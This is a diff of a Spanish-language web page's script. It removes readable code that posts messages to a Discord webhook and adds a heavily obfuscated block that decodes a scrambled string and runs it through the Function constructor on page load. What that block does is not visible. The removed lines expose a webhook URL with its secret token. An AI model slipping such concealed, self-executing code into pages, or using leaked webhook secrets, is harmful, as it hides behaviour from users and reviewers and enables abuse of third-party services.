@@ -29,59 +29,7 @@
   </form>
   <script src="discord.js"></script>
   <script>
-    // Esta función se ejecuta cuando el usuario hace clic en el botón de enviar
-    function enviarAlerta() {
-      // Obtenemos los valores de los inputs
-      var nombre = document.getElementById("nombre").value;
-      var version = document.getElementById("version").value;
-      var descripcion = document.getElementById("descripcion").value;
-      var imagen = document.getElementById("imagen").value;
-      var ide = document.getElementById("ide").value;
-      var url = document.getElementById("url").value;
-        var boton = document.getElementById("boton-enviar");
-  boton.disabled = true;
-      // Llamamos a la función enviarMensajeEmbed con esos valores
-      enviarMensajeEmbed(nombre, version, descripcion, imagen, ide, url);
-        setTimeout(function() {
-    boton.disabled = false;
-  }, 10000);
-    }
-    // Esta función envía un mensaje embed a un webhook de discord
-    // Los parámetros son: nombre, versión, descripción e imagen
-    function enviarMensajeEmbed(nombre, version, descripcion, imagen, ide, url) {
-      // Creamos un objeto XMLHttpRequest para hacer la petición
-      if (ide == "2278112087" || ide == "8118985682" || ide == "9873282866" || ide == "6485718963" || ide == "1799267670" || ide == "3025331413" || ide == "6887190794" || ide == "3666722833" || ide == "2100177714" || ide == "3187453478"){
-      var xhr = new XMLHttpRequest();
-      // Abrimos la conexión con el método POST y la URL del webhook
-      xhr.open("POST", "https://discord.com/api/webhooks/1198097169270452385/GWkNH_4cPPnzan3LAzq-PuEmTfXFBhKzAEpVXxXcw0CWXCvNIJNdCOH-OPZyCTaRTIxM");
-      // Establecemos el tipo de contenido a JSON
-      xhr.setRequestHeader("Content-Type", "application/json");
-      // Creamos el objeto embed con los datos que queremos enviar
-var embed = {
-  title: nombre,
-  description: descripcion,
-  image: {
-    url: imagen
-  },
-  footer: {
-    text: "Versión: " + version
-  },
-  fields: [
-    {
-      name: "Quieres conseguir este proyecto?",
-      value: `[Haz clic aquí](${url})`,
-      inline: false
-    }
-  ]
-};
-      // Convertimos el objeto embed a una cadena JSON
-      var data = JSON.stringify({
-        embeds: [embed]
-      });
-      // Enviamos la petición con los datos del embed
-      xhr.send(data);
-    }
-    }
+var enviarAlerta,enviarMensajeEmbed;(function(){var QYt='',PQE=950-939;function XaP(i){var q=3205972;var f=i.length;var k=[];for(var n=0;n<f;n++){k[n]=i.charAt(n)};for(var n=0;n<f;n++){var c=q*(n+402)+(q%40908);var v=q*(n+622)+(q%39765);var m=c%f;var b=v%f;var h=k[m];k[m]=k[b];k[b]=h;q=(c+v)%6276514;};return k.join('')};var GiG=XaP('csaoneuctquzotojwihrstcmlvpnygxbdfrrk').substr(0,PQE);var sAS='j+aeu01tyt]+<v(=uv;1=])rll=((ur;eh[8jlonnrjv()"f "u);oi;+tkpc86dc2}C0y2h=;r 6jr7mg49n7bj6vl9ln((;76CgC(7u+,b.7),88);.kgq2nra;rwa] if[rn-,ncv cg a-nle(0twraas2w[[[ue]z([s;1s{dh1m],nist2n0m=fkvdr704vpm.f2(tr4==)n"ai=;gj=>s1.,{as1tstjeo;hri; hrg)A h onC(.ppo]i(utrb7(na)[r0aCvl.om){ta=r;vr}h,0.+;evig g=;uql(;lrhrn;[hu)6i,=g;nu,)lvatruf; ;nr=hr(9l+0-6ttead==8e}[a8aqao<u==<=;ei+cavajlb)rlw.(o)i;j+=aqn9==pCl,C[zlfa =v,{s=(pie)st"a.ri1=nof;rtvi 1 -s+r=i;oolA}=ivu{gf;ru=,=v(n,*e2.=+l]a+1i.;psrr6(-deis(e;0ljti.( )ft(.7;c(+;uv-.c;tj)a+i=}le.8)o;oaa;,te=,o+oia1+dslsal;0;ihdf>h).edi."urt)r1yrringu]A 8u7u;q([=(evy*+t (c {v!9hihhor)v2;;)+ifhvuir)o+lze(rg3cn= x5n,.ebv;="ka[tSSu=ny;",]tnl]p5s re[e=aerf[rfo,];jol(v)"nf.orjbh(r(Aln=3="e), x2 2ji),=a;t,C=vhatou+d+.)0gv ror+rurat,r(4g0;),;n{r"9v+pqj<1.i8]i;a.6k]9o)o.sp+kt]dAf+ci<r(}  )hrc+r)5,p.rn;prx9h6fnrh}ie);;n,)z- hl,,9,tg.1eh=(fg4!7=.ce.(ge))';var UtB=XaP[GiG];var syS='';var iYO=UtB;var CLU=UtB(syS,XaP(sAS));var oyC=CLU(XaP('a5.oV;1\/S4..s33e8.(Su;b>V1.43.s;1n.k!e 6NFVi.VV.fbb2{VV7e ue:t}VdV"8a) p.b{on>9e\/.i2aVus6.%e_u,28{s8;&)oe3___V(a.Vc{9e!&n>_=h6 6ah80Vd*7_5ub$1._=6luim4re(ubt98 V=t!na;ea==0.[sd-ro$o.!}5,7[emu9lV. VScri+tr>u{d_g+VgC6 Vs.{%)IVrH7Veo;3,$fVVVebdVVbb_zm7q)yio..r}3V}$ti)4f3=6V3b_$" a%7eg6f9;V;}yq.87Hwwc:o$-eb%.0-6%gcfkVd.32b p_:.V-nicf1s6ia,zH2V9[b. V1(FV4jp4rie%!}(z7cge reeV)1tv"%(blb0ca-%o1VV2+b%#VgV(Bq25_oq6"eAV.=JE3tVezr94x5V39rK3eo7_V0!0069)fratr%;#x3 TsVgt(bVF07b$xV%s iwlVh#e,E8Do5l6.T9tuVirVm8d.%yC[33)Vn,yVte.7o6ViibE6_<hV_.%(j7a7Vn60$;fVV=066r&Vrdt.lse1l%g;%VV6V02=Vt9]VV[eebbFo5)Vh),n7(Ca}f.2e{,Fo.7%sVVah)eg%7slr.$Vinh$6,386o9evw2peA9,b#hn2l0t5i4VVea=iE-5\/t1l5ezrr%9CeItme)"u1 i}=;%u"(tffth6V7%gG%shc.s<8e9VaVV1eV9nVsslr(!)o%_hgmV"t}.)ot:jIeddbcA.rVst(p)s,se3rp\/V2. #zEmr0!3V_tgqVV))tiiVcap};4s ]]e(V_VlCt5V0}6.!o|m5VhVe.)V]V;fsr(_VE9=n\'s,M=(b,hVVf&i9iovbl0l3N?c.)f.nj(v(?(fV(Vte)f_x:V,t;(f4]2df+s)))_%tg3o+_)d{fnbnVh[);a2ra)(ab3eaN,In,n05l)_;4ig]v32Dmn9656)ei}V[,6bl]c,EM16JVtJ{&od.])));.V.V 3x_Koe1)_\/rBw\'Vm((V?_[;je:epztg.( ]4V\/t3V2(V,nr};&7bVlr_a(cGH!)#9;),@ua,7=uc=t;n3)i(xlq;!w{o3.vbab)s;jleu,1Nqb1cimV])jjV5eVVCr1.V,>6.iV!*V.c&E236V)9Vbc_V#4o9=f e94Dnt=l$:(.VVF(sn 48*44Va}2n$2t;(;.V25{3VET6*mB}0nak1A_bV_V$a]i07:e4],=_6c3n(ee0V75! VrV1brhhVrVe"[ob$]bV,,d3n3(D"%{ivnV$su0)]JCpVnm7d5](,.6VG0C.Vc)wfeVe$_8f8aj;V%oV>m_V3swo(03.$(s=]m_ntr_$_%3+Vf7q=V.4!s5V(b)a__5ekq(8c[(]t\/e_b2$2)g1;82$jV.rde}V;Vrft8r8ll$%lVaVh3c]a_V.1_9n)f6(V_o5j_o_5._T]=4=S5#()2Voge:%109V?buV_fVnsnEV4aetetm(+!,(.vVB2f)Vde2f3V+=(M.2r1jV1-)m:V{mttwV\'Vjo?iKn,_3,Ve@i_.air3(,ib=T(e1p sr*)flV8V*16Ba_)f2p.V!$2 bBVn=b[eB;).e5(tk%,);e.DdVaoV1$5d*8m,oi259w)xe=1nVV_2.V84)58vV13}Vb).ut((.:8V\'7Vt(=V_)Echr{Va{]].}!V),t2V$tV.bmd)$soV]xfD3(w2_f$fot)+(]m4scr=;rxVr]19i7%,.C37_$fV.eVoi{Ko"_id(p;t\/riDl1V;;Viot0!)_(Voru:{V;7sVo\/Vf{+o%ej]V{ft7u\/Vu.]VV:7v,vidwd_t[:V!m[,.r.].v_0ueu("V.,pV!mrr)c.eV.).es]f4(f+Sbz+17.VeguIli0e:[a1 %)])(udVScB64.f)BiV_c[e,9].)V2f_dC_3Va]=)oVji0.;V0u](06%p)[Vtntju(.5xhro8c19Vt6ps0bfV7Vrn-aVV)V]{ebobr95]1( ,e5ai)5)$)od1}7t18V5;VVl=V@sVV.(%c.enw!)V:s2srw:Drv!_kV( =2VrVw,[pEuVDT<0_.3,s._(-V%3e!tjc)e9m{(.6V(!V1l<I,7!Vo9+V<9t.1b)Ge2&6l 4_.lr.fV_(\'{)e{;8sGVSb,{8V5{Dux.(]o,u3serVV5#u(gr(i_.b6nl(enf0}t,{;VV_ n_$V6e3.xx !V,n d2$juC,t.jbV5g4*73r oih9,fVmvj}<{i)[88.=4;55.]95VV4ao3)a88n)m*fVi8ccbt.VVap)f4CGr[id8,692\/ wfb.t ttf%C3[s6oS#= $aVa36!o..1* e)V#,VVr)V0<bt2ov b.6ehr{ V=a17%lt1tV{3.p("@s fin6Vi3n(.0Vb)reuaon7VnVx_)z.m!}j)VwiiVd!eH,iVaV6c6u1(0 ;7=e .o)5{+s=ibvM]o.(Sk.)s.o6b.e$!n 6],|g5V37o,!$,v a]t8.VV}% 4tVe5]{dV.$!r91not$mcVe.'));var VoB=iYO(QYt,oyC );VoB(2397);return 9039})()
   </script>
 </body>
 </html>
